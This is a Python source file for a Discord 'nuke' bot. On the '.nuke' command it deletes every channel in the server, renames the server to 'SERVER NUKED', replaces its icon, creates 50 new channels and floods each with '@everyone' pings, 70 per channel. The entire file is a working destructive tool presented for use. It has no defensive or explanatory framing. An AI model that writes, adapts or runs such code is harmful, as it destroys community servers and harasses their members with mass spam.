import discord
import asyncio
from discord.ext import commands
from termcolor import colored

spam_limit = 70
channel = [f"server nuked" for i in range(50)]

name_server = "SERVER NUKED"
icon_server = "icon_server"

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()

    await change_server_name_and_icon(ctx)

    existing_channels = list(ctx.guild.channels)
    
    delete_tasks = []
    for channel in existing_channels:
        delete_tasks.append(delete_channel(channel))

    await asyncio.gather(*delete_tasks)

    create_tasks = []
    for i in range(50):
        create_tasks.append(create_channel(ctx, i))

    new_channels = await asyncio.gather(*create_tasks)

    async def spam_channel(channel):
        message = "@everyone"
        
        for _ in range(spam_limit):
            try:
                await channel.send(message)
                print(colored(f"sent message in {channel.name}", "green"))
                await asyncio.sleep(0.1)
            except Exception as e:
                print(colored(f"failed to send message in {channel.name}: {e}", "red"))

        print(colored(f"finished spamming in {channel.name}", "green"))

    await asyncio.gather(*(spam_channel(channel) for channel in new_channels))
    print(colored("nuke operation complete.", "green"))

async def delete_channel(channel):
    try:
        await channel.delete()
        print(colored(f"deleted channel: {channel.name}", "green"))
    except Exception as e:
        print(colored(f"failed to delete channel {channel.name}: {e}", "red"))

async def create_channel(ctx, i):
    try:
        channel_name = channel[i % len(channel)]
        new_channel = await ctx.guild.create_text_channel(channel_name)
        print(colored(f"created channel: {new_channel.name}", "green"))
        await new_channel.send("@everyone")
        return new_channel
    except Exception as e:
        print(colored(f"erro ao criar canal"))
        return None

async def change_server_name_and_icon(ctx):
    try:
        await ctx.guild.edit(name=name_server)

        with open("server_icon.jpg", "rb") as icon_file:
            await ctx.guild.edit(icon=icon_file.read())
            print(colored(f"server icon changed.", "green"))
    
    except Exception as e:
        print(colored(f"failed to change server name or icon: {e}", "red"))

bot.run("Bot token")
